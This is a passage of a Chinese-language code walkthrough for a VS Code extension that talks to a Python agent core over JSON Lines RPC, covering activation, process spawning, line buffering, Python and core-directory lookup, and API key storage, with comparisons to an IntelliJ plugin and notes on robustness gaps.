# 第 09 卷 · 其它 Shell 与验证体系

> 本卷讲两件在 01–08 卷里被「借过」但没展开的东西：
> 1. **第二个 Shell**——`vscode/` 里的 TypeScript 扩展。它跟 IntelliJ 插件说同一套 JSON Lines RPC，但每一处实现细节都不同，差异本身就是一份「协议最小要求」的清单。
> 2. **验证体系**——`core/tests/` 的 26 个 `test_*.py`（另有 1 个辅助 MCP 服务器）、`core/scripts/` 的 10 个冒烟脚本 + 1 份性能基线、`vscode/scripts/` 的 2 个 Node 脚本。它们把前八卷讲过的每条不变量钉成了可执行断言。
>
> 本卷所有行号都取自 3.3.0 的源码快照；`panel.ts` 与 `session.ts` 在 3.3.0 里因「团队 / 交付物 / 思考通道」增加了约 300 行，小节标题区间已同步更新。

## 本卷统计（脚本实测）

| 范围 | 文件数 | 行数 | 说明 |
|---|---:|---:|---|
| `vscode/src/*.ts` | 10 | 2,511 | 扩展全部逻辑（不含 `out/` 编译产物） |
| `vscode/scripts/*.js` | 2 | 201 | `smoke-rpc.js` 142 + `check-settings.js` 59 |
| `vscode/tsconfig.json` | 1 | 14 | `strict: true`、`target: ES2020` |
| `core/tests/*.py` | 27 | 4,112 | 26 个 `test_*.py` + `fake_mcp_server.py` |
| `core/scripts/*.py` | 11 | 2,453 | 10 个 `smoke_*` + `bench_core.py` |
| **合计** | **51** | **9,291** | |

对照：IntelliJ Shell 是 81 Java 文件 + 1 Kotlin 文件 / 17,659 行（见 README §4.1）。也就是说 **VS Code 壳只有 IntelliJ 壳的 14% 体量，却覆盖了除「多标签会话」与「富文本渲染」之外的全部能力**——因为它把渲染外包给了 Webview 的一坨 HTML 字符串。

---

## 0. 导览：这一卷该按什么顺序读

### 0.1 分层图（VS Code Shell）

```
┌──────────────────────────────────────────────────────────────┐
│ Webview（panel.ts 里的 HTML 字符串，无框架）                  │
│   #log  #todos  #history  #memory  #input  #status            │
└───────────────▲──────────────────────────┬───────────────────┘
                │ postMessage               │ postMessage
┌───────────────┴──────────────────────────▼───────────────────┐
│ ChatPanel（panel.ts）  WebviewViewProvider                     │
│   下行 API：appendUser/appendToken/setTodos/showHistory/...     │
│   上行回调：onSend/onStop/onConfirm/onHistory*/onMemory*/...     │
└───────────────▲──────────────────────────┬───────────────────┘
                │ 直接方法调用               │ setHandlers
┌───────────────┴──────────────────────────▼───────────────────┐
│ CoreSession（session.ts）  ← 等价于 Java 的 AgentChatPanel     │
│   进程生命周期 / settings 下发 / 14 个通知路由 / 历史与记忆     │
│   ┌─────────────┐  ┌──────────────┐  ┌──────────────────┐    │
│   │ settings.ts │  │ secrets.ts   │  │ locator.ts       │    │
│   └─────────────┘  └──────────────┘  └──────────────────┘    │
└───────────────▲──────────────────────────┬───────────────────┘
                │ notification 事件          │ request/notify
┌───────────────┴──────────────────────────▼───────────────────┐
│ RpcConnection（rpc.ts）  EventEmitter + 行缓冲                  │
└───────────────▲──────────────────────────┬───────────────────┘
                │ stdout                    │ stdin
┌───────────────┴──────────────────────────▼───────────────────┐
│ agent_core 进程（Python，01–07 卷）                            │
└──────────────────────────────────────────────────────────────┘
        ▲
        │ tool/invoke → ToolRunner（tools.ts）→ diff.ts / inline.ts
```

### 0.2 文件索引

| # | 文件 | 行 | 讲什么 | 对应 Java 侧 |
|---|---|---:|---|---|
| §1 | `extension.ts` | 46 | 激活入口、命令注册、配置监听 | `AgentToolWindowFactory` + `plugin.xml` |
| §2 | `rpc.ts` | 148 | 子进程 + 行协议 + pending 表 | `CoreProcess` + `JsonRpcConnection` |
| §3 | `locator.ts` | 73 | 找 Python / core 目录 / 打包可执行文件 | `PythonLocator` |
| §4 | `secrets.ts` | 47 | SecretStorage 迁移、三级优先级 | `PasswordSafe` 相关调用 |
| §5 | `settings.ts` | 70 | 18 个设置项 → 14 个下发字段 | `AgentCoreService.pushSettings` |
| §6 | `panel.ts` | 774 | Webview HTML + DOM 渲染 + 消息协议 | `ChatView` + `MarkdownRenderer` + 所有 `*View` |
| §7 | `session.ts` | 669 | 会话状态机、14 个通知分支、历史/记忆/团队 | `AgentChatPanel` + `ChatSessionPanel` |
| §8 | `tools.ts` | 521 | 11 个工具实现 + 权限弹窗 + 终端执行 | `agent/tools/*.java` |
| §9 | `diff.ts` / `inline.ts` | 40 + 123 | 原生 diff 确认 / ghost text | `DiffConfirmCard` / `AgentInlineCompletionProvider.kt` |
| §10 | 双壳对照表 | — | 逐项列出「同协议、不同实现」 | — |
| §11 | `core/tests/**` | 4,112 | 26 个测试文件逐文件拆解 | — |
| §12 | `core/scripts/**` | 2,453 | 10 个冒烟 + 1 个压测 | — |
| §13 | 跨层不变量 | — | 测试与冒烟共同守住的东西 | — |

### 0.3 三条阅读主线

1. **协议是唯一的耦合面**：TypeScript 侧没有一行代码 import Python。`rpc.ts` 的 `request/notify` 加 30 个 `method` 字符串（12 个请求、14 种下行通知、4 个上行通知）就是全部契约（§7.11 有完整表）。
2. **差异即需求**：Java 有 `ProjectWriteGate`、`SessionTabsBar`、`DiffConfirmCard`，VS Code 一个都没有——但 Core 并不知道，所以「哪些能力是 Core 保证的、哪些是壳自愿提供的」在这两个实现的对比里第一次说清楚（§10）。
3. **测试是文档的可执行副本**：§11 每个文件后面都标了它锁住的那条不变量，以及它在第几卷被讲过。

---

## 1. `extension.ts`（46 行）：激活只做四件事

```ts
 9  export function activate(context: vscode.ExtensionContext): void {
10    const panel = new ChatPanel(context.extensionUri);
11    const session = new CoreSession(context, panel);
12    // Ghost text: reads the live connection, never starts one.
13    // 行内补全只读现有连接，不自行拉起 Core。
14    const inline = new InlineCompletionProvider(() => session.connectionOrNull());
15
16    context.subscriptions.push(
17      vscode.window.registerWebviewViewProvider(ChatPanel.viewId, panel, {
18        webviewOptions: { retainContextWhenHidden: true },
19      }),
20      vscode.commands.registerCommand("agentCoder.openChat", () =>
21        vscode.commands.executeCommand("agentCoder.chatView.focus")),
22      vscode.commands.registerCommand("agentCoder.generateDailyReport", () => {
23        void vscode.commands.executeCommand("agentCoder.chatView.focus");
24        void session.send("请生成今天的日报，先采集今日 Git 提交再组织内容");
25      }),
26      vscode.commands.registerCommand("agentCoder.restartCore", () => session.restart()),
27      vscode.workspace.onDidChangeConfiguration((event) => {
28        if (event.affectsConfiguration("agentCoder")) {
29          session.pushSettings();
30        }
31      }),
32      inline,
33      { dispose: () => session.dispose() },
34    );
35
36    void session.ensureStarted().catch((error: unknown) => {
37      const message = error instanceof Error ? error.message : String(error);
38      panel.appendSystem(`[错误] ${message}`);
39      panel.setStatus("启动失败");
40      void vscode.window.showErrorMessage(`Agent Coder: ${message}`);
41    });
42  }
```

### 1.1 `activate()`（9 行）

四件事，顺序有讲究：

| 步 | 行 | 做了什么 | 为什么必须在这个位置 |
|---|---:|---|---|
| 1 | 10 | 造 `ChatPanel` | 它只存 `extensionUri`，不碰网络，构造零风险 |
| 2 | 11 | 造 `CoreSession` | 构造器里就 `setHandlers(...)`（`session.ts:36-50`），把面板的 13 个回调接上 |
| 3 | 14 | 造行内补全 | 传入的是 **getter** `() => session.connectionOrNull()`，不是连接本身——补全永远不主动拉起 Core |
| 4 | 16-34 | 全部塞进 `context.subscriptions` | VS Code 停用扩展时按序 `dispose()`，无需手写清理 |
| 5 | 36-41 | **异步**启动 Core | 不 `await`：激活不能因为 Core 起不来就失败，否则整个扩展连面板都不出现 |

📌 **`inline` 的构造时机**：`new InlineCompletionProvider(...)` 的构造器里直接调用 `vscode.languages.registerInlineCompletionItemProvider({ pattern: "**" }, this)`（`inline.ts:17`）。所以第 32 行把 `inline` 放进 subscriptions 时，注册**已经发生了**，它只是借 `dispose()` 注销。

🔁 对照：IntelliJ 侧没有「注册」这一步——`plugin.xml` 里声明 `<toolWindow>` 与 `<editorFactoryListener>`，由平台调工厂（02 卷 §3）。VS Code 是**命令式激活**：只有 `onView:agentCoder.chatView` 触发时才跑 `activate`。

⚠️ **`activate` 返回 `void` 而非 `Promise`**：VS Code 在 `activate` 返回后即认为扩展就绪。若用户立刻关窗口，`ensureStarted()` 的 Promise 会被丢弃，Core 子进程可能残留到父进程退出才被回收。改成 `async activate` 并 `await` 启动能避免，但会把「启动慢」暴露成「激活慢」。

### 1.2 三个命令（20-26 行）

| 命令 id | 行 | 行为 | 备注 |
|---|---:|---|---|
| `agentCoder.openChat` | 20-21 | 等价于点侧边栏图标 | `executeCommand("agentCoder.chatView.focus")` 是 VS Code 给每个视图自动生成的隐藏命令 |
| `agentCoder.generateDailyReport` | 22-25 | 聚焦面板 + 直接发一条固定指令 | 指令文本写死中文，与 Core 里 `daily-report` Skill 的触发词对齐（07 卷 §6） |
| `agentCoder.restartCore` | 26 | `session.restart()` | 对应 Java 的设置页「重启 Core」按钮 |

📌 `generateDailyReport` 里两行都加了 `void`：`executeCommand` 与 `send` 都返回 Promise，这里是「发了就算」的语义。`send` 内部自己 `try/catch`（`session.ts:116-149`），所以不会产生未处理的 rejection。

⚠️ 第 24 行没有检查「当前是否已有任务在跑」。`send` 的第一行是 `if (!text.trim() || this.currentTaskId) return;`（`session.ts:117`），所以任务进行中点「生成日报」会**静默无事发生**——面板上没有任何提示。Java 侧对应的行为是按钮被禁用（视觉上可感知）。

### 1.3 配置监听（27-31 行）

```ts
27  vscode.workspace.onDidChangeConfiguration((event) => {
28    if (event.affectsConfiguration("agentCoder")) {
29      session.pushSettings();
30    }
31  }),
```

`affectsConfiguration("agentCoder")` 是前缀匹配，所以改 `agentCoder.model`、`agentCoder.mcpServers` 都会命中。`pushSettings()` 内部：

```ts
145  pushSettings(): void {
146    void this.keyReady.then(() => {
147      this.connection?.notify("settings/update", collectSettings(this.apiKey));
148    });
149  }
```

📌 **`this.connection?.`**：Core 没起时这里是空转。这不是 bug——`ensureStarted()` 在拉起进程后会立刻 `notify("settings/update", ...)`（`session.ts:112`），配置不会丢。

⚠️ **`apiKey` 只有在 `keyReady` 完成后才可能非空**。`keyReady` 是构造器里就发起的 `loadApiKey()`（`session.ts:35`），所以第一次 `pushSettings` 一定排在它后面。这是整个壳里唯一一处「必须等异步初始化」的隐式依赖。

### 1.4 激活失败的兜底（36-41 行）

```ts
36  void session.ensureStarted().catch((error: unknown) => {
37    const message = error instanceof Error ? error.message : String(error);
38    panel.appendSystem(`[错误] ${message}`);
39    panel.setStatus("启动失败");
40    void vscode.window.showErrorMessage(`Agent Coder: ${message}`);
41  });
```

三处输出，三种媒介：对话流（永久）、状态行（当前状态）、系统通知（抢注意力）。`ensureStarted` 抛出的两种消息在 `session.ts:78-83`：

- `未找到 core 目录或打包好的 Core。请设置 agentCoder.coreHome 或 AGENT_CORE_HOME`
- `未找到 Python（需 3.9+）。请设置 agentCoder.pythonPath 或 AGENT_PYTHON`

🔁 对照：Java 的 `AgentCoreService.connection()` 抛 `IOException`，由 `ChatSessionPanel` 捕获后写进对话流（01 卷 §3.2）。两边都是「启动失败不是崩溃」。

### 1.5 `deactivate()`（44-46 行）

```ts
44  export function deactivate(): void {
45    // The session is disposed through context.subscriptions.
46  }
```

空实现。`session.dispose()` 挂在 `context.subscriptions` 的最后一项（第 33 行）。VS Code 保证停用时**逆序** dispose，所以它最后执行——此时面板与补全都已注销，不会再有回调打到已经关闭的连接上。

📌 这是 VS Code 的惯例写法：**能在 `subscriptions` 里表达的生命周期，就不要写进 `deactivate`**。

---

## 2. `rpc.ts`（148 行）：一个 148 行的 JSON Lines 客户端

这一节是整个壳里最值得逐行读的文件：它有缓冲区、有 pending 表、有进程退出处理，是所有「多进程行协议」的最小完整实现。

### 2.1 类型与字段（8-35 行）

```ts
 8  export interface RpcMessage {
 9    id?: string;
10    method?: string;
11    params?: Record<string, unknown>;
12    ok?: boolean;
13    result?: Record<string, unknown>;
14    error?: { code?: string; message?: string };
15  }
16
17  interface Pending {
18    resolve: (message: RpcMessage) => void;
19    reject: (error: Error) => void;
20  }
21
22  export interface SpawnOptions {
23    python?: string;
24    coreHome?: string;
25    executable?: string;
26    projectId: string;
27    dataDir: string;
28  }
29
30  export class RpcConnection extends EventEmitter {
31    private readonly process: ChildProcessWithoutNullStreams;
32    private readonly pending = new Map<string, Pending>();
33    private buffer = "";
34    private nextId = 0;
35    private disposed = false;
```

- **一个类型覆盖四种帧**：请求（有 `id`）、响应（有 `id` + `ok/result/error`）、通知（有 `method`）、以及 Core 对 Shell 发起请求的响应（只有 `id`，`method` 为空）——最后一种目前没用到，见 2.6。
- `ChildProcessWithoutNullStreams`：`spawn` 默认给 `stdin/stdout/stderr` 三条流，这个类型保证三者非 null，后面用 `this.process.stdin.write` 不需要判空。
- `pending` 的 key 是字符串 id（`req-1`、`req-2`…），不是数字——因为协议里 `id` 是 `string`。
- `buffer` 是**跨 chunk 的行缓冲**：一次 `data` 事件可能只有半行，也可能有三行半。

📌 **`extends EventEmitter`** 而不是回调注入：`session.ts` 用 `connection.on("notification" | "stderr" | "exit", ...)` 订阅（`session.ts:92-102`）。好处是补全、冒烟脚本都能各自订阅，互不覆盖。

### 2.2 构造器（37-73 行）：两种启动方式

```ts
37  constructor(options: SpawnOptions) {
38    super();
39    const args = ["--project-id", options.projectId, "--data-dir", options.dataDir];
40    if (options.executable) {
41      this.process = spawn(options.executable, args, {
42        cwd: dirname(options.executable),
43        env: { ...process.env, PYTHONIOENCODING: "utf-8" },
44      });
45    } else {
46      const coreHome = options.coreHome ?? "";
47      this.process = spawn(
48        options.python ?? "python3",
49        ["-m", "agent_core", ...args],
50        {
51          cwd: coreHome,
52          env: {
53            ...process.env,
54            PYTHONPATH: `${coreHome}/src`,
55            PYTHONIOENCODING: "utf-8",
56          },
57        },
58      );
59    }
60    this.process.stdout.setEncoding("utf-8");
61    this.process.stdout.on("data", (chunk: string) => this.onData(chunk));
62    this.process.stderr.setEncoding("utf-8");
63    this.process.stderr.on("data", (chunk: string) => this.emit("stderr", chunk));
64    this.process.on("exit", (code) => {
65      for (const [, pending] of this.pending) {
66        pending.reject(new Error(`agent core exited (${code})`));
67      }
68      this.pending.clear();
69      if (!this.disposed) {
70        this.emit("exit", code);
71      }
72    });
73  }
```

| 分支 | 条件 | 命令行 | cwd | 环境 |
|---|---|---|---|---|
| A 打包 | `options.executable` 存在 | `agent-core.exe --project-id .. --data-dir ..` | 可执行文件所在目录 | 只加 `PYTHONIOENCODING` |
| B 源码 | 否则 | `python -m agent_core --project-id .. --data-dir ..` | `coreHome` | 加 `PYTHONPATH=<coreHome>/src` |

🔁 对照 Java `CoreProcess`（01 卷 §2）：Java 也是两种分支，参数完全一致（`--project-id`、`--data-dir`），但 Java 额外做了「读 stderr 线程」与「读 stdout 线程」两条独立线程；Node 是事件循环里的回调，天然非阻塞。

📌 **`cwd: coreHome`（46、51 行）** 当 `coreHome` 是 `undefined` 时变成 `cwd: ""`。Node 的 `spawn` 把空字符串当「未指定」处理，回退到 `process.cwd()`——所以不会崩，但**工作目录就变成了 VS Code 进程的目录**。这是隐式兜底，`ensureStarted` 已经保证走到这里时 `coreHome` 或 `executable` 至少有一个（`session.ts:75-77`）。

📌 **`PYTHONPATH` 用 `${coreHome}/src` 的斜杠拼接**：Windows 上 Python 接受混合分隔符，所以 `C:\repo\core/src` 是合法的。但如果 `coreHome` 为空，会变成 `/src`——一个不存在但无害的路径。

⚠️ **`exit` 回调里 reject 全部 pending（64-68 行）**：这是「进程死了，所有等待都该立刻失败」的正确做法。但副作用是——**任何 `void request(...)` 的调用点都会产生未处理的 Promise rejection**。`session.ts:524` 就是一处：

```ts
433  private replyConfirm(confirmId: string, approved: boolean): void {
434    void this.connection?.request("agent/confirmResult", { confirmId, approved });
435  }
```

若 Core 恰好在此刻退出，这个 Promise 被 reject 而无人 catch。Node 15+ 默认把未处理的 rejection 升级为进程崩溃——扩展宿主进程会挂。修法是在 `replyConfirm` 里 `.catch(() => undefined)`。

⚠️ **不监听 `error` 事件**：若 `spawn` 的目标不存在（例如 `python` 没装），Node 会 emit `'error'` 而不是 `'exit'`。没有 `process.on("error")`，这个事件会变成**未捕获异常**，直接打出 `Unhandled 'error' event` 并可能终止扩展宿主。`locatePython()` 不做存在性检查（§3.2），所以这条路径是真实可达的。

### 2.3 `onData()`（75-86 行）：行缓冲

```ts
75  private onData(chunk: string): void {
76    this.buffer += chunk;
77    let index = this.buffer.indexOf("\n");
78    while (index >= 0) {
79      const line = this.buffer.slice(0, index).trim();
80      this.buffer = this.buffer.slice(index + 1);
81      if (line) {
82        this.dispatch(line);
83      }
84      index = this.buffer.indexOf("\n");
85    }
86  }
```

四步循环：追加 → 找 `\n` → 切出整行 → 剩余部分留回 buffer。

📌 **`.trim()`（79 行）** 解决 Windows 的 `\r\n`：Python 侧 `print(..., flush=True)` 在 Windows 上输出 `\r\n`，`slice` 出来会带 `\r`，`JSON.parse` 不吃 `\r`。`trim()` 一并处理首尾空白。

📌 **空行直接跳过（81 行）**：Core 不会故意发空行，但 `PYTHONIOENCODING` 或包装脚本可能多打一个换行。

⚠️ **`buffer` 无上限**：如果 Core 侧某个 bug 导致一行永远不结束（例如日志里打了 500 MB 没有换行），`this.buffer += chunk` 会一直涨到 OOM。Java 的 `JsonRpcConnection` 也按行读，但用的是 `BufferedReader.readLine()`，同样有单行过长的问题——两边都没防。

⚠️ **`setEncoding("utf-8")` 假设每条 `data` 都是完整字符**：Node 的 StringDecoder 会正确处理**跨 chunk 的多字节字符**，所以中文 token 不会被截断。这一点容易误判为 bug，实际是安全的。

### 2.4 `dispatch()`（88-113 行）：三路分流

```ts
 88  private dispatch(line: string): void {
 89    let message: RpcMessage;
 90    try {
 91      message = JSON.parse(line) as RpcMessage;
 92    } catch {
 93      this.emit("stderr", `drop invalid frame: ${line.slice(0, 200)}`);
 94      return;
 95    }
 96    if (message.method) {
 97      this.emit("notification", message);
 98      return;
 99    }
100    if (message.id) {
101      const pending = this.pending.get(message.id);
102      if (!pending) {
103        return;
104      }
105      this.pending.delete(message.id);
106      if (message.ok === false) {
107        const text = message.error?.message ?? "rpc request failed";
108        pending.reject(new Error(text));
109      } else {
110        pending.resolve(message);
111      }
112    }
113  }
```

| 分支 | 判定 | 处理 |
|---|---|---|
| 解析失败 | `JSON.parse` 抛错 | 塞进 `stderr` 事件（不会崩） |
| 通知 | 有 `method` | emit `notification` |
| 响应 | 有 `id` | 查 pending → reject/resolve |
| 其它 | 两者都无 | 静默丢弃 |

📌 **`message.ok === false` 才 reject（106 行）**：Core 的两个构造函数都**显式写** `ok`——`make_response` 给 `{"id", "ok": True, "result"}`（`protocol.py:147-148`），`make_error` 给 `{"id", "ok": False, "error"}`（`protocol.py:151-152`）。所以判「显式 false」与判「非 true」在当前协议下等价；写成「显式 false」是为了让未来新增的帧类型（例如 Core 主动请求的响应）默认按成功处理。

⚠️ **`method` 优先于 `id`（96 行先于 100 行）**：若某一帧同时带 `method` 与 `id`（Core 向 Shell 发请求就会这样），它会被当成通知，**永远不会被当作请求处理**，Shell 也不会回包。注释在 Python 侧对应为 `if method is None: return  # response to a core-initiated request; nothing to do yet`（`server.py:239-240`）——两端都明确把「Core 主动发请求」这条路留空了。

⚠️ **未知 id 静默丢弃（102-104 行）**：超时后迟到的响应（`inline/complete` 的 1.5 s 超时，`inline.ts:8`）会走到这里。不记录、不告警，所以「补全偶尔不出现」很难从日志定位。

### 2.5 `request()` / `notify()` / `write()`（115-133 行）

```ts
115  request(method: string, params: Record<string, unknown>): Promise<RpcMessage> {
116    const id = `req-${++this.nextId}`;
117    const payload = { id, method, params };
118    return new Promise<RpcMessage>((resolve, reject) => {
119      this.pending.set(id, { resolve, reject });
120      this.write(payload);
121    });
122  }
123
124  notify(method: string, params: Record<string, unknown>): void {
125    this.write({ method, params });
126  }
127
128  private write(payload: unknown): void {
129    if (this.disposed || this.process.stdin.destroyed) {
130      return;
131    }
132    this.process.stdin.write(`${JSON.stringify(payload)}\n`);
133  }
```

📌 **先登记后发送（119→120）**：这是顺序上的关键。如果先 `write` 后 `set`，理论上响应可能在微任务里先到（同进程事件循环不会，但这是好习惯）。Java 的 `JsonRpcConnection` 同样是「先 put 到 map 再写」。

📌 **id 用递增计数器而非 uuid**：`req-N` 只在单进程内唯一，够用且可肉眼追踪。Core 侧不关心 `id` 的具体形状，只回填。

⚠️ **`request()` 没有超时**：`session.ts` 里所有 `await connection.request(...)`（`chat/start`、`session/*`、`memory/*`、`agent/confirmResult`）都没有超时保护。Core 若卡在某个 `await` 上不返回，`send()` 会永远挂在 `await`，面板停在「思考中...」。唯一的超时是 `inline.ts` 的 `withTimeout(..., 1500)`（`inline.ts:109`）。

⚠️ **`write` 静默失败（129-131 行）**：进程已死时 `notify` 什么都不做也不报错。所以 `stop()` 在 Core 已崩溃时是「按了没用，也没有提示」。

### 2.6 `isAlive()` / `dispose()`（135-147 行）

```ts
135  isAlive(): boolean {
136    return !this.disposed && this.process.exitCode === null;
137  }
138
139  dispose(): void {
140    this.disposed = true;
141    try {
142      this.process.stdin.end();
143    } catch {
144      // best effort
145    }
146    this.process.kill();
147  }
```

📌 **`exitCode === null` 表示还活着**：Node 进程对象在退出后 `exitCode` 变成数字（或 `null` + `signalCode` 有值）。两者都不判会让 `kill -9` 后的进程被误判为存活——这里只看 `exitCode`，信号杀死时它是 `null`，所以**被信号杀死的进程会被误判为存活**。实际影响：`ensureStarted()` 早退（`session.ts:71-73`），不会重启。

⚠️ **`dispose()` 不等待退出**：`kill()` 之后立即返回。若立刻 `new RpcConnection(...)`（`session.ts:389-394` 的 `restart` 就是如此），新旧两个 Core 可能短暂并存，同时写同一个 `dataDir`。Java 的 `restart()` 同样不等待（`AgentCoreService:107-115`）。

🔁 **完整对照表：Java `JsonRpcConnection` vs TS `RpcConnection`**

| 关注点 | Java（01 卷 §2.3） | TypeScript |
|---|---|---|
| 读线程 | 独立线程 `BufferedReader.readLine()` | 事件循环回调 + 手动行缓冲 |
| 写同步 | `synchronized` 包 `writer.write` | Node 单线程，`stdin.write` 天然串行 |
| id 生成 | 自增 `long` | 自增 `number` → `req-N` |
| 超时 | `CompletableFuture` 无超时 | `Promise` 无超时 |
| 进程退出 | 读线程结束 → 失败所有 future | `exit` 事件 → reject 所有 pending |
| 向 Shell 分发 | `handler.accept(message)`（读线程上！） | `emit("notification")`（事件循环上） |
| 错误帧 | 未知 id 记 warn | 未知 id 静默 |

⚠️ 最后两行的差异是**真实行为差异**：Java 在 RPC 读线程上直接调 `onCoreMessage`，导致 §08 卷 15 章那 3 处「非 EDT 改 Swing」；TS 在事件循环上回调，所有 DOM 更新都必须 `postMessage` 给 Webview——**跨线程问题被进程边界自动消灭了**。这也是为什么 VS Code 壳里找不到 `runOnEdt` 这类东西。

---

## 3. `locator.ts`（73 行）：三方探测

这个文件回答两个问题：**用哪个 Python**、**core 目录在哪**；外加一个「有没有打包好的可执行文件」。

### 3.1 共用常量与 `firstExisting`（8-12 行）

```ts
 8  const CORE_MARKER = join("src", "agent_core", "__main__.py");
 9
10  function firstExisting(candidates: string[]): string | undefined {
11    return candidates.find((candidate) => candidate && existsSync(candidate));
12  }
```

- `CORE_MARKER` 是**判断「这个目录是不是 core」的唯一依据**：只看 `<dir>/src/agent_core/__main__.py` 在不在，不看 `pyproject.toml`、不看目录名。
- `firstExisting` 里 `candidate &&` 是为了过滤空串——`resolve("")` 会得到当前目录，若不过滤，空配置会误命中 cwd。

🔁 对照 Java `PythonLocator.isCoreHome()`（`PythonLocator.java:68`），判据完全一样。

### 3.2 `locatePython()`（14-26 行）：三级优先级，**不验证**

```ts
14  export function locatePython(): string | undefined {
15    const configured = vscode.workspace.getConfiguration("agentCoder").get<string>("pythonPath");
16    if (configured && configured.trim()) {
17      return configured.trim();
18    }
19    const fromEnv = process.env.AGENT_PYTHON;
20    if (fromEnv && fromEnv.trim()) {
21      return fromEnv.trim();
22    }
23    // On Windows the launcher is usually "python"; elsewhere prefer python3.
24    const candidates = process.platform === "win32" ? ["python", "python3"] : ["python3", "python"];
25    return candidates[0];
26  }
```

| 优先级 | 来源 | 处理 |
|---|---|---|
| 1 | `agentCoder.pythonPath` | `trim()` 后直接用 |
| 2 | `AGENT_PYTHON` | `trim()` 后直接用 |
| 3 | 平台默认 | Windows 返回 `"python"`，其它平台 `"python3"` |

⚠️ **函数名是 `locate`，但它什么都没定位**：第 25 行直接返回 `candidates[0]`，既不 `existsSync` 也不 `--version`。所以：

- Windows 上装了 Anaconda 但只有 `python.exe` → 正常；
- 只装了 `py` 启动器（Microsoft Store 版 Python 常见）→ 返回的 `python` 不存在 → `spawn` 触发 `'error'` 事件 → 由于 `rpc.ts` 没监听 `error`（§2.2），最终表现为**扩展宿主里一条未捕获异常**。

🔁 对照 Java `locatePython()`（`PythonLocator.java:26-40`）：它真的会依次执行 `python --version`、`python3 --version`（`isExecutable`，L165-170），失败则返回 `null`，再由 `AgentCoreService` 抛成一句可读的中文错误（`AgentCoreService.java:86-89`）。**这是两侧最明显的健壮性差距。**

### 3.3 `locateCoreHome()`（28-52 行）：候选表 + 标记校验

```ts
28  export function locateCoreHome(context: vscode.ExtensionContext): string | undefined {
29    const configured = vscode.workspace.getConfiguration("agentCoder").get<string>("coreHome");
30    const candidates: string[] = [];
31    if (configured && configured.trim()) {
32      candidates.push(resolve(configured.trim()));
33    }
34    const fromEnv = process.env.AGENT_CORE_HOME;
35    if (fromEnv && fromEnv.trim()) {
36      candidates.push(resolve(fromEnv.trim()));
37    }
38    const extensionRoot = context.extensionUri.fsPath;
39    // vscode/ lives next to core/ inside the repository, and one level down when packaged.
40    candidates.push(resolve(extensionRoot, "..", "core"));
41    candidates.push(resolve(extensionRoot, "..", "..", "core"));
42    candidates.push(resolve(extensionRoot, "core"));
43    for (const workspace of vscode.workspace.workspaceFolders ?? []) {
44      candidates.push(resolve(workspace.uri.fsPath, "core"));
45    }
46    for (const candidate of candidates) {
47      if (existsSync(join(candidate, CORE_MARKER))) {
48        return candidate;
49      }
50    }
51    return firstExisting(candidates);
52  }
```

候选顺序与对应的部署形态：

| # | 候选 | 命中场景 |
|---:|---|---|
| 1 | `agentCoder.coreHome` | 用户显式指定 |
| 2 | `AGENT_CORE_HOME` | CI / 脚本 |
| 3 | `<扩展目录>/../core` | **仓库开发态**：`vscode/` 与 `core/` 同级 |
| 4 | `<扩展目录>/../../core` | 打包成 `.vsix` 后解到 `extensions/<publisher>.<name>-<ver>/` 时往上两级 |
| 5 | `<扩展目录>/core` | 有人把 core 塞进扩展目录一起打包 |
| 6 | `<每个工作区>/core` | 用户在自己的仓库里放了一份 core |

📌 **两段式判定（46-51 行）**：先找**带标记**的候选，全都不是才退化成「第一个存在的目录」。第二段是为了让错误信息出现在 Core 启动时（`ModuleNotFoundError: agent_core`）而不是在这里就返回 `undefined`——但代价是错误信息更绕。

⚠️ **`firstExisting` 兜底可能返回 `vscode/` 本身**：若候选 3/4/5 都不存在、工作区也没有 `core`，`firstExisting` 只会返回 `undefined`（因为前面每个候选都被 push 过但都不存在）——这一条实际是安全的。真正的问题是第 6 项：工作区里的 `core` 目录如果存在但不是 Agent Core（比如用户自己的业务模块也叫 core），它会被选中并作为 `PYTHONPATH` 传给 Python。

### 3.4 `locateCoreExe()`（54-73 行）：打包产物优先

```ts
56  export function locateCoreExe(context: vscode.ExtensionContext): string | undefined {
57    const fromEnv = process.env.AGENT_CORE_EXE;
58    if (fromEnv && fromEnv.trim() && existsSync(fromEnv.trim())) {
59      return fromEnv.trim();
60    }
61    const name = process.platform === "win32" ? "agent-core.exe" : "agent-core";
62    const extensionRoot = context.extensionUri.fsPath;
63    const candidates = [
64      join(extensionRoot, "bin", name),
65      resolve(extensionRoot, "..", "core", "dist", name),
66      resolve(extensionRoot, "..", "..", "core", "dist", name),
67    ];
68    const workspace = vscode.workspace.workspaceFolders?.[0]?.uri.fsPath;
69    if (workspace) {
70      candidates.push(resolve(workspace, "core", "dist", name));
71    }
72    return firstExisting(candidates);
73  }
```

- 环境变量这一支**先校验再返回**（`existsSync`），与 `locateCoreHome` 的「不校验、交给启动器」不同。
- `bin/` 是 VSIX 内的位置；`core/dist/` 是 `scripts/build_core.ps1` 的产物位置（02 卷 §6）。

📌 **`ensureStarted()` 的优先级**（`session.ts:75-91`）：`locateCoreExe` 先跑，命中就完全不用 Python。这与 Java 的 `AgentCoreService:80-95` 一致——**打包版优先于源码版**。

### 3.5 三个 locate 的调用关系

```
ensureStarted()
 ├─ locateCoreExe(context)   ── 命中 → spawn(exe, [--project-id, --data-dir])
 ├─ locatePython()           ── 仅当 exe 未命中时需要
 └─ locateCoreHome(context)  ── 仅当 exe 未命中时需要
```

⚠️ 两个「未命中」的组合才会抛错（`session.ts:78-83`）：只有 coreHome 没有 python → 报 Python 缺失；只有 python 没有 coreHome → 报 core 缺失。

---

## 4. `secrets.ts`（47 行）：API Key 的三级来源与一次迁移

### 4.1 常量与返回类型（6-13 行）

```ts
 6  export const API_KEY_SECRET = "agentCoder.apiKey";
 7
 8  export interface ApiKeyState {
 9    key: string;
10    // True when a plaintext value was moved into SecretStorage during this call.
11    // 本次调用是否把明文迁进了加密存储。
12    migrated: boolean;
13  }
```

`migrated` 不是「有没有 Key」，而是「**这次是否发生了迁移**」，用于让上层只提示一次（`session.ts:58-62`）。

### 4.2 `ensureApiKey()`（15-34 行）：三个分支

```ts
15  export async function ensureApiKey(context: vscode.ExtensionContext): Promise<ApiKeyState> {
16    const config = vscode.workspace.getConfiguration("agentCoder");
17    const stored = ((await context.secrets.get(API_KEY_SECRET)) ?? "").trim();
18    const plain = (config.get<string>("apiKey", "") ?? "").trim();
19
20    if (stored) {
21      // Secrets win; a leftover plaintext value must not shadow the encrypted one.
22      // 以加密存储为准，残留的明文一并清掉。
23      if (plain) {
24        await clearPlaintextKey(config);
25      }
26      return { key: stored, migrated: false };
27    }
28    if (plain) {
